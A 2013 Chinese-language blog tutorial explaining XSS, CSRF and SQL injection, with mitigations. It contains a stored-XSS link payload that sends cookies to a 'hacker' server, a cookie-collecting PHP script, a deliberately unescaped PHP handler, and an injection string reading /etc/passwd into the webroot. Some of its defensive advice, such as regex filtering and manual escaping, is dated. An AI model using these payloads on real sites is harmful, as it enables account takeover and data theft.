---
title: 初探web中的XSS和CSRF攻击
date: 2013-10-05 08:19:50
---
理解web安全
===

这几天接触了一下web安全，其中涉及到:

* XSS攻击 —— cross site script
* CSRF攻击 —— cross site request forgery
* XSS+CSRF(蠕虫)
* SQL注入

首先要理解XSS和CSRF，因为这是两种利用web缺陷发起的基本攻击，但是其威力也不容小视。首先我们要认识到HTTP协议是无状态的，也即一次请求响应和下一次没有关系，或者说没有状态之间的联系，而应用中必须保持着某种状态，例如在cookie中存一些数据。而web中的session其实是基于cookie的，只是记录的这个cookie是经过加密的一个sessionid，从而用来确认用户身份。曾经听说过网站中这次登录，如果用户选择了下次自动登录，则服务器将会记录一个sessionid,作为下次登陆的凭证，但是只使用一次，下次登录又申请新的，服务器每次发送请求，都带上了该网站的cookie，但是cookie是可以在客户端被修改的。cookie保存在浏览器中的确是很危险的，在后面的例子中我们就可以看到它是怎样被轻易拿走的。


### XSS
XSS攻击分为两种：

* 反射型
* 存储型

所谓反射型，就是点击了某个链接触发了某个漏洞，从而被利用发送相关信息到黑客服务器上，被窃取。另外一种是常见的评论或者是帖子，包含了一些恶意代码，但是被提交存储到了数据库中，这样每次其他用户访问该网页，也会受到侵扰，其中夹带很多恶意链接，用户点了之后或许会受到攻击。

反射型，很常见的就是构造了一个带有恶意的链接，比如有如下表单：

    <body>
	<form action="php/index.php" method="POST">
		<input type="text" name="user_name"><br>
		<input type="password" name="user_passwd"><br>
		
		<textarea name="user_descr" rows=5 cols=80></textarea><br>
		<input type="submit" value="提交">
	</form>
    </body>

是提交评论或者是注册，里面提供了一些可以注入的地方，例如我们往textarea注入恶意代码，也就是看是否能够让服务器存储起来，渲染出来祸害别的用户。假设黑客填入了如下的信息：

    
    <a href="http://abc.com"   onclick="window.location='http://localhost/hacker/index.php';"> hello  </a>

服务器端直接获取用户数据，予以存储，这里仅仅做一个模拟，直接把用户数据输出。相当于注入逃过了PHP的检查，从而成为存储型XSS。

    $name = $_POST['user_name'];
    $passwd = $_POST['user_passwd'];
    $descr = $_POST['user_descr'];
    
    print $name;
    print ' ';
    print $passwd;
    
    
    print '<span>' . $descr . '</span>';
    
黑客的服务器，用来获取用户的cookie

    <?php
    $cookie = $_GET['c'];
    // 写到一个文件里面
    print_r($cookie);

chrome浏览器会报错误，对于表单中的敏感字符串如script标签，js代码做了处理，所以提交不到服务端：

![XSS攻击警告](http://www.bibodeng.com/content/plugins/kl_album/upload/201310/112db41ad44e2bbeb0dc695f3dd00fc92013100500193628335.png)

但是IE内核的搜狗浏览器却中招了，当点击该链接的时候，将发送该用户的cookie到hacker的服务器上，这样就达到了初步的攻击。nodeJS社区上有更加精彩的XSRF攻击，利用注入的代码，获取用户信息，并且假冒用户发出各种请求（服务器中处理各种请求的就是功能函数，直接用url可访问），导致alert满天飞，并且自动顶帖。其实所有允许嵌入html标签的地方，都是相当危险的。

对于存储型的攻击，服务器端应该对用户的输入中敏感字符进行转义。严格来讲，不能信赖我们发送出去的客户端，更加不能信赖用户的输入。

上面例子中google浏览器对于提交的数据中带有脚本拒不运行，但是在搜狗兼容模式下，居然注入成功了，黑客提交的数据假设已经存储起来了，未加任何的处理直接在模板中直接输出，而用户点击了之后，会触发事件，从而向恶意服务器发送用户的cookie信息。发送的方式有很多种，例如图片src请求，location.href直接跳转，以及某些事件触发脚本运行，例如onclick。

防范的方法：

1. 替换或过滤`<script>`等标签
2. 输出html标签时进行转义，防止恶意代码运行（大部分博客的评论都采用此法）。

### CSRF

跨站请求伪造，就是说恶意网站窃取用户的身份及权限，到某个正常网站上进行操作。例如自动发微博，加关注，转帐，消费等，对用户数据及财产带来危害。

由于web的客户端一般是公开的，而服务端的处理地址已知，这样就可以模拟用户的请求，向服务端发送请求。例如当用户在浏览某正常网站A的时候，并登陆，在浏览器端记录了cookie等数据，这时候点开了一个恶意网站B,B向A网站发起了某个请求，例如加关注，其中因为同一个浏览器下，各个进程之间甚至可以共享cookie等数据，也可以是XSS注入中提供的cookie等数据，这样就可以骗过A网站搞破坏了。

其实服务器端从将客户端代码发送到客户之后，就不应该信任客户端了，因为它可能被篡改，或者被模拟。故而需要一个机制确认这就是我自己发出去的客户端，而不是伪造的。常见的方法就是：

* 验证码 将验证码记录在session中，由服务器生成，生成图片发送到客户端，验证一致则认定安全
* 在表单中设置一个hidden项 服务器生成随机数，发送到客户端，提交表单时候一起提交到服务器验证

但是如果用户受到了XSS攻击，那么是有办法将这个验证码弄到手并发送到黑客服务器脚本的，这样相当于有个间谍在内部，拿到了电报密码，代号什么的都不管用了。其实不管什么办法，这都不安全，除非进行认证（密码学），确实不可伪造。

### SQL注入
对于SQL注入，就是说黑客预料到可能会执行某个sql操作，于是提交含有恶意代码的输入。例如：

    $query = “SELECT * FROM v_movie WHERE movieid=$movieid” ;
    // 而movieid用户输入的是
    $movieid = “1 UNION select load_file(‘/etc/passwd’) into outfile ‘<webroot>/passwd.txt’”;

那么将会把密码都输出到服务器某个文本文件上，黑客可以直接按url访问，这相当恐怖。所以对于所有要放到数据库中的数据，在PHP中都要进行严格的数据检查，对于敏感的如单引号，双引号等应该予以转义。我们开发中常用的就是自己写一个addSlash。coolshell的博客中还提及了利用摄像头摄入车牌号进行注入，可谓是无所不能。

对sql注入主要的防范方法有：

1. 严格检查参数类型
2. 使用正则表达式来过滤数据
3. 严格限制执行权限（刚刚好够用的权限，而不是root）
4. 注意日志，追踪攻击

参考链接：

[stack overflow](http://stackoverflow.com/questions/129677/whats-the-best-method-for-sanitizing-user-input-with-php/130323#130323)

[coolshell微博蠕虫分析](http://coolshell.cn/articles/4914.html)

[nodejs注入实例](http://snoopyxdy.blog.163.com/blog/static/60117440201281294147873/)

by bibodeng 2013-10-05